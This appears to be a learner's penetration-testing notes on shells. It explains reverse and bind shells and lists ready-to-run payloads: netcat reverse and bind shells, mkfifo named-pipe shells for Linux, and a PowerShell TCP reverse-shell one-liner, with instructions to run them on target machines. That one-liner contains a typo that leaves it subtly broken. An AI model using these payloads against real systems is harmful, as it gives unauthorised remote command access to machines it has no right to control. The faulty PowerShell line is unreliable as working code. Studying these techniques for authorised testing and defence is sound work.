# Shell

Shells are used to interact with CLI(get a better defination from wiki).

When attacking a remote machine we try to use the vulnerability of the service running to a get a reverse shell.

Check this [Shell vs terminal](https://www.geeksforgeeks.org/what-is-terminal-console-shell-and-kernel/#:~:text=After%20writing%20our%20commands%20on,1.&text=2.,-Checks%20the%20syntax)

There are two kinds of shells bind shells and reverse shells.

When we force the target to send a reverse connection and receive it using a listener like netcat than it is called reverse shell. Reverse shell can bypass firewall.

Eg: On attack machine run `nc -lvnp <port>` and in target machine run `nc <attack-ip> <port> -e /bin/bash`. Now you will get a reverse shell.

Bind shells means opening up a port on the target to run our commands.

Eg: On target machine run `nc -lvnp <port> -e "cmd.exe"` and in attack machine run `nc <target-ip> <port>`

Now we got the shell it is very unstable and limited. It can be upgraded using python, socat or rlwrap. Python technique is explained in commands.

For rlwrap just use it with nc like `rlwrap nc -lvnp <port>`

## Common Shell Payloads
For Linux targets
```
mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
```
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
```
For windows powershell
```
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0$sendbyte.Length);$stream.Flush()};$client.Close()"
```
Change the ip and port and run on the target machines
